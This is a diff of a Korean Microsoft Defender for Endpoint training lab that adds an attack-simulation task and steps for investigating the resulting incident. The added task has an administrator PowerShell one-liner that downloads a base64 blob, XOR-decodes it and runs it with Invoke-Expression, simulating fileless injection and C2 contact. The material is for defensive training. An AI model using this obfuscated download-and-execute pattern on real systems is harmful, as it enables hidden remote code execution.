@@ -40,20 +40,6 @@ lab:
 
     >**참고:** 스크립트를 성공적으로 실행한 후 몇 분 후에 Microsoft Defender XDR 포털에서 경고가 생성되면 창이 자동으로 닫힙니다.
 
-<!--- ### Task 2: Simulated Attacks
-
->**Note:** The Evaluation lab and the Tutorials & simulations section of the portal is no longer available. Please refer to the **[interactive lab simulation](https://mslabs.cloudguides.com/guides/SC-200%20Lab%20Simulation%20-%20Mitigate%20attacks%20with%20Microsoft%20Defender%20for%20Endpoint)** for a demonstration of the simulated attacks.
-
-1. From the left menu, under **Endpoints**, select **Evaluation & tutorials** and then select **Tutorials & simulations** from the left side.
-
-1. Select the **Tutorials** tab.
-
-1. Under *Automated investigation (backdoor)* you will see a message describing the scenario. Below this paragraph, click **Read the walkthrough**. A new browser tab opens which includes instructions to perform the simulation.
-
-1. In the new browser tab, locate the section named **Run the simulation** (page 5, starting at step 2) and follow the steps to run the attack. **Hint:** The simulation file *RS4_WinATP-Intro-Invoice.docm* can be found back in portal, just below the **Read the walkthrough** you selected in the previous step by selecting the **Get simulation file** button.
-
-    <!--- 1. Repeat the last 3 steps to run another tutorial, *Automated investigation (fileless attack)*. This is no longer working due to win1 AV --->
-
 ### 작업 2: 경고 및 인시던트 조사
 
 이 태스크에서는 이전 태스크의 온보딩 검색 테스트 스크립트에서 생성된 경고 및 인시던트에 대해 조사합니다.
@@ -84,6 +70,46 @@ lab:
 
 1. 공격 스토리, 경고, 자산, 조사, 증거 및 대응* 및 *요약* 탭의 내용을 *검토합니다. 디바이스 및 사용자가 자산 탭 아래에 *있습니다*. 실제 인시던트에서 *공격 스토리* 탭에는 인시던트 그래프*가 *표시됩니다. **힌트:** 표시 크기 때문에 일부 탭이 숨겨질 수 있습니다. 줄임표 탭(...)을 선택하여 해당 탭을 표시합니다.
 
-<!---    >**Warning:** The simulated attacks here are an excellent source of learning through practice. Only perform the attacks in the instructions provided for this lab when using the course provided Azure tenant.  You may perform other simulated attacks *after* this training course is complete with this tenant. --->
+### 작업 3 공격 시뮬레이션
+
+>**경고:** 이 시뮬레이션된 공격은 연습을 통해 학습하는 훌륭한 소스입니다. 과정 제공 Azure 테넌트 사용 시 이 랩에 제공된 지침에서만 공격을 수행합니다.  이 테넌트에서 *이 교육 과정을 완료한 후* 다른 시뮬레이션된 공격을 수행할 수 있습니다.
+
+이 작업에서는 WIN1 가상 머신에 대한 공격을 시뮬레이션하고 엔드포인트용 Microsoft Defender 공격을 감지하고 완화했는지 확인합니다.
+
+1. WIN1 가상 머신에서 시작** 단추를 마우스 오른쪽 단추로 클릭하고 *** Windows PowerShell(관리)**을 선택합니다**. * 
+
+1. “사용자 계정 컨트롤” 창이 표시되면 **예**를 선택하여 앱을 실행할 수 있도록 합니다.
+
+1. 다음 시뮬레이션 스크립트를 복사하여 PowerShell 창에 붙여넣고 Enter** 키를 눌러 **실행합니다.
+
+    ```PowerShell
+    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+    ;$xor = [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');
+    $base64String = (Invoke-WebRequest -URI "https://wcdstaticfilesprdeus.blob.core.windows.net/wcdstaticfiles/MTP_Fileless_Recon.txt" -UseBasicParsing).Content;Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) };$i = 0;
+    $decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i];
+    $i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
+    ```
+
+    >**참고:** 스크립트를 실행하는 동안 오류가 발생하는 경우 메모장 앱을 열고 스크립트를 빈 파일로 복사할 수 있습니다. 메모장 단어 줄 바꿈*이 켜져 있는지 확인*합니다. PowerShell에서 스크립트의 각 줄을 개별적으로 복사하고 실행합니다.
+
+1. 스크립트는 여러 줄의 출력과 do기본 컨트롤러를 확인하지 못했다는 메시지를 *생성합니다기본*. 몇 초 후에 *메모장* 앱이 열립니다. 시뮬레이션된 공격 코드가 메모장 삽입됩니다. 자동으로 생성된 메모장 인스턴스를 열어 두면 전체 시나리오를 경험할 수 있습니다. 시뮬레이션된 공격 코드는 외부 IP 주소(C2 서버 시뮬레이션)와 통신하려고 시도합니다.
+
+### 작업 4: 시뮬레이션된 공격을 단일 인시던트로 조사
+
+1. Microsoft Defender XDR 포털**의 왼쪽 메뉴 모음에서 인시던트** 및 경고를 선택한 다음, 인시던트 선택 ****
+
+1. 한 엔드포인트*에서 방어 회피 및 검색과 관련된 다단계 인시던트라는 *새 인시던트가 오른쪽 창에 있습니다. 인시던트 이름을 선택하여 세부 정보를 로드합니다.
+
+1. *공격 스토리* 탭에서 경고** 및 **인시던트 세부 정보** 창을 축소**하여 전체 **인시던트 그래프**를 봅니다.
+
+1. 인시던트 그래프 노드를 **마우스로 가리키고 선택하여 엔터티를 *검토합니다*.**
+
+1. 경고 창(왼쪽)을 **** 다시 확장하고 공격 스토리** *실행* 재생 아이콘을 **선택합니다. 경고별 공격 타임라인 경고를 표시하고 인시던트 그래프*를 *동적으로 채웁니다.
+
+1. 공격 스토리, 경고, 자산, 조사, 증거 및 대응* 및 *요약* 탭의 내용을 *검토합니다. 디바이스 및 사용자가 자산 탭 아래에 *있습니다* . **힌트:** 표시 크기 때문에 일부 탭이 숨겨질 수 있습니다. 줄임표 탭(...)을 선택하여 해당 탭을 표시합니다.
+
+1. 증거 **및 응답** 탭에서 IP 주소를** 선택한 **다음, 표시된 *IP 주소를* 선택합니다. 팝업 창에서 IP 주소 세부 정보를 검토하고 아래로 스크롤하여 IP 주소 페이지** 열기 단추를 선택합니다**.
+
+1. 조직 탭에서 *IP 주소* 페이지 *개요, 인시던트 및 경고 및 관찰됨의 내용을 검토* 합니다. 일부 탭에는 IP 주소에 대한 정보가 포함되지 않을 수 있습니다.
 
 ## 이 랩을 완료했습니다.
